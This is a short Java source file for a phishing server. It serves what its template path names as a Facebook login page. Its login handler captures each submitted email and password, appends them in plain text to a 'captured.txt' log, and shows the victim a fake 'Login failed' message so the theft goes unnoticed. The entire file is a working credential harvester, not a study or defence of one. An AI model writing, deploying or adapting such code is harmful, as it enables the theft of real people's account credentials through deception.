package org.guercifzone.Chatgpt;

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;

public class Fishing {

    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);

        // Serve index.html
        server.createContext("/", exchange -> {
            byte[] response = Files.readAllBytes(Paths.get("src/main/resources/templates/facebook/index.html"));
            exchange.getResponseHeaders().add("Content-Type", "text/html");
            exchange.sendResponseHeaders(200, response.length);
            OutputStream os = exchange.getResponseBody();
            os.write(response);
            os.close();
        });

        // Handle POST login
        server.createContext("/login", new LoginHandler());

        server.setExecutor(null); // default
        System.out.println("Server started on http://localhost:8080");
        server.start();
    }

    static class LoginHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equals(exchange.getRequestMethod())) {
                InputStream is = exchange.getRequestBody();
                String formData = new String(is.readAllBytes());

                Map<String, String> params = parseFormData(formData);
                String email = params.getOrDefault("email", "");
                String pass = params.getOrDefault("pass", "");

                String log = "EMAIL: " + email + " | PASS: " + pass + "\n";
                Files.write(Paths.get("logs/captured.txt"), log.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);

                String response = "<h2>Login failed</h2><p>Invalid credentials</p>";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }

        private Map<String, String> parseFormData(String data) throws UnsupportedEncodingException {
            Map<String, String> map = new HashMap<>();
            for (String pair : data.split("&")) {
                String[] kv = pair.split("=");
                if (kv.length == 2) {
                    map.put(URLDecoder.decode(kv[0], StandardCharsets.UTF_8), URLDecoder.decode(kv[1], StandardCharsets.UTF_8));
                }
            }
            return map;
        }
    }
}

